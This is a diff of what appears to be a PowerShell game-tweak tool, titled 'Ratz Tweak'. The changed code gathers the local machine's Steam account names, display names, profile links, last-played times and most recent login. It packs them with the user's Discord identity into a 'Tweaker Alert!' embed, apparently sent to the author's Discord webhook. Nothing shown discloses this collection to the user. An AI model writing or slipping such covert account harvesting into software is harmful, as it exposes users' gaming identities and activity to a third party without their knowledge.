@@ -2051,7 +2051,9 @@ function Get-SteamAccounts {
             # Default values - use Steam login time from loginusers.vdf
             $lastActivity = $loginRecord.LastLoginTime
             $activitySource = "Steam Login"
-            $profileUrl = "https://steamcommunity.com/profiles/$steamId64"
+            
+            # Use Steam3 ID format for profile URL (matches userdata folder name)
+            $profileUrl = "https://steamcommunity.com/profiles/[U:1:$steam3Id]"
             
             # Look for userdata folder with this Steam3 ID
             foreach ($basePath in $steamPaths) {
@@ -2149,55 +2151,62 @@ function Get-SteamAccounts {
 
         $timestamp = (Get-Date).ToUniversalTime().ToString('o')
         $mention = if ($UserId) { "<@${UserId}>" } else { $null }
-        $desc = 'New Run!'
-        if ($MessagePrefix) { $desc = 'Problem reported' }
         
         # Detect Steam accounts and library information
         $steamAccounts = Get-SteamAccounts
         $steamLibraryInfo = Get-SteamLibraryInfo
         
-        # Build fields array with Steam accounts
+        # Build fields array
         $fieldsArray = @(
-            @{ name = 'Username';  value = ("$UserName" + $(if ($mention) { " ($mention)" } else { '' })); inline = $false }
-            @{ name = 'UserID';    value = "$UserId";   inline = $true }
+            @{ name = 'Username'; value = "$UserName ($mention)"; inline = $false }
         )
         
-        # Add consolidated Steam accounts section
-        if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
-            $steamLines = @()
-            
-            # Show most recent account at the top
-            if ($steamLibraryInfo.MostRecentAccount) {
-                $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
-                $steamLines += ""
-            }
-            
-            # Build combined account list (sorted by most recent activity)
-            $accountLines = $steamAccounts | ForEach-Object {
-                $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
-                    "$($_.PersonaName) [$($_.AccountName)]"
-                } else {
-                    "$($_.UserName) [$($_.AccountName)]"
-                }
+        # Add Steam Accounts section
+        if ($steamAccounts.Count -gt 0) {
+            $steamAccountLines = $steamAccounts | ForEach-Object {
+                # Format: Account Name [Display Name](link)
+                $accountName = $_.AccountName
+                $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) { $_.PersonaName } else { $_.UserName }
+                $profileLink = $_.ProfileUrl
                 
-                "**$displayName** • $($_.LastActivity) ($($_.ActivitySource))"
+                "**$accountName** [$displayName]($profileLink)`nLast Played: $($_.LastActivity)"
             }
             
-            if ($accountLines) {
-                $steamLines += $accountLines
-                $steamValue = $steamLines -join "`n"
-                $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
-            } else {
-                $fieldsArray += @{ name = 'Steam Accounts'; value = 'No accounts found with Naraka activity'; inline = $false }
-            }
+            $steamAccountValue = $steamAccountLines -join "`n`n"
+            $fieldsArray += @{ name = 'Steam Accounts'; value = $steamAccountValue; inline = $false }
         } else {
             $fieldsArray += @{ name = 'Steam Accounts'; value = 'None detected'; inline = $false }
         }
         
+        # Add Steam Login History section
+        if ($steamLibraryInfo.LoginHistory.Count -gt 0) {
+            $loginLines = @()
+            
+            # Most recent account with link
+            if ($steamLibraryInfo.MostRecentAccount) {
+                $mostRecent = $steamLibraryInfo.LoginHistory | Select-Object -First 1
+                $accountName = $mostRecent.AccountName
+                $displayName = if ($mostRecent.PersonaName -and $mostRecent.PersonaName -ne $accountName) { 
+                    $mostRecent.PersonaName 
+                } else { 
+                    $accountName 
+                }
+                $steamId64 = $mostRecent.SteamID
+                
+                # Convert SteamID64 to Steam3 ID for profile URL
+                $steam3Id = ([long]$steamId64 - 76561197960265728) -band 0xFFFFFFFF
+                $profileUrl = "https://steamcommunity.com/profiles/[U:1:$steam3Id]"
+                
+                $loginLines += "**Most Recent:** [$accountName - $displayName]($profileUrl)"
+            }
+            
+            $loginValue = $loginLines -join "`n"
+            $fieldsArray += @{ name = 'Steam Login History'; value = $loginValue; inline = $false }
+        }
+        
         $embed = @{
-            title       = 'Ratz Tweak Alert'
-            description = $desc
-            color       = 16711680
+            title       = 'Tweaker Alert!'
+            color       = 16711680  # Red
             timestamp   = $timestamp
             fields      = $fieldsArray
         }
@@ -2207,10 +2216,11 @@ function Get-SteamAccounts {
             $embed['thumbnail'] = @{ url = $AvatarUrl }
         }
         
+        # Set content message
         if ($MessagePrefix) {
             $content = if ($mention) { "$MessagePrefix $mention" } else { $MessagePrefix }
         } else {
-            $content = if ($mention) { "New run by $mention" } else { 'New run started.' }
+            $content = if ($mention) { "New Run by $mention" } else { 'New run started.' }
         }
         $payload = @{ content = "$content"; embeds = @($embed) }
         $json = $payload | ConvertTo-Json -Depth 10
